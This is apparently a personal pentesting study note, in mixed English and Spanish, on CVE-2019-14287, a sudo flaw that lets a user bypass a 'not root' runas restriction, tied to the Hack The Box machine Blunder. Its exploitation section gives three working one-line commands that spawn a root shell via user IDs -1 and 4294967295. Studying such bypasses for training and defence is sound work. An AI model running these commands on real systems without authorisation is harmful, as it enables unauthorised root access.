## DESCRIPTION

CVE-2019-14287

The configuration above is supposed to stop `sudo` as running as the root user. There was a public CVE release in November 2019 about how there were other ways to enter root besides `root` that got around this restriction. This impacts `sudo` versions before 1.8.28

¿Que necesitamos?

1. Poder ejecutar algún comando como sudo

![[Pasted image 20230302191827.png]]
Bypasaremos la protección del usuario -> Podremos **ejecutar lo que viene despues como el usuario root.**

#### Mas información
* https://0xdf.gitlab.io/2020/10/17/htb-blunder.html#priv-www-data--huge
* https://www.exploit-db.com/exploits/47502

## EXPLOITATION

```
#Probar todos

sudo -u#0 /bin/bash

sudo -u#-1 /bin/bash

sudo -u#4294967295 /bin/bash
```

## MACHINES

* Hack The Box: Blunder
